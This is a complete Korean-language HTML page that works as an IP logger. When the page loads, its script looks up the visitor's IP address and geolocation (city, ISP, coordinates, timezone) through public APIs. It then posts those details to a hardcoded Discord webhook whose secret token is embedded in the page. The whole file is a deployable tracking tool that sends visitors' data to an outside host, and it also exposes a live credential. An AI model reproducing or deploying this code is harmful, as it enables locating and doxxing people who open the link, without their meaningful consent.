<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>접속 정보 수집기</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            padding: 40px;
            max-width: 500px;
            width: 100%;
            text-align: center;
        }
        h1 {
            color: #333;
            margin-bottom: 20px;
            font-size: 24px;
        }
        p {
            color: #666;
            margin-bottom: 30px;
            line-height: 1.6;
        }
        .loading {
            display: inline-block;
            width: 40px;
            height: 40px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .success {
            color: #28a745;
            font-weight: bold;
            margin-top: 20px;
        }
        .error {
            color: #dc3545;
            font-weight: bold;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>접속 정보 수집 중...</h1>
        <p>잠시만 기다려주세요. 접속 정보를 수집하고 있습니다.</p>
        <div class="loading"></div>
        <div id="message"></div>
    </div>

    <script>
        // 디스코드 웹훅 URL
        const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1545789173879930983/X6I-0ZN0Z_7f6necgv6Ccn3UxTDkP1QEsPD8eYUMIiJE9lymXrD5mxyEYDsIn_KbH2QH';

        // IP 및 위치 정보 수집 함수
        async function collectAndSendData() {
            try {
                // IP 및 위치 정보 가져오기
                const response = await fetch('https://api.ipify.org?format=json');
                const ipData = await response.json();
                const ip = ipData.ip;

                // 위치 정보 가져오기
                const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
                const geoData = await geoResponse.json();

                // 디스코드에 보낼 메시지 구성
                const embed = {
                    embeds: [
                        {
                            title: '새로운 접속 감지',
                            color: 5814783, // 보라색
                            fields: [
                                {
                                    name: 'IP 주소',
                                    value: ip,
                                    inline: true
                                },
                                {
                                    name: '국가',
                                    value: geoData.country_name || '알 수 없음',
                                    inline: true
                                },
                                {
                                    name: '지역',
                                    value: geoData.region || '알 수 없음',
                                    inline: true
                                },
                                {
                                    name: '도시',
                                    value: geoData.city || '알 수 없음',
                                    inline: true
                                },
                                {
                                    name: '통신사',
                                    value: geoData.org || '알 수 없음',
                                    inline: true
                                },
                                {
                                    name: 'ISP',
                                    value: geoData.isp || '알 수 없음',
                                    inline: true
                                },
                                {
                                    name: '위도/경도',
                                    value: `${geoData.latitude || '알 수 없음'}, ${geoData.longitude || '알 수 없음'}`,
                                    inline: true
                                },
                                {
                                    name: '시간대',
                                    value: geoData.timezone || '알 수 없음',
                                    inline: true
                                }
                            ],
                            timestamp: new Date().toISOString(),
                            footer: {
                                text: '접속 정보 수집기'
                            }
                        }
                    ]
                };

                // 디스코드 웹훅으로 전송
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(embed)
                });

                // 성공 메시지 표시
                document.getElementById('message').innerHTML = '<div class="success">접속 정보가 성공적으로 전송되었습니다!</div>';
                document.querySelector('.loading').style.display = 'none';

            } catch (error) {
                console.error('오류 발생:', error);
                document.getElementById('message').innerHTML = '<div class="error">정보 수집 중 오류가 발생했습니다.</div>';
                document.querySelector('.loading').style.display = 'none';
            }
        }

        // 페이지 로드 시 실행
        window.addEventListener('load', collectAndSendData);
    </script>
</body>
</html>
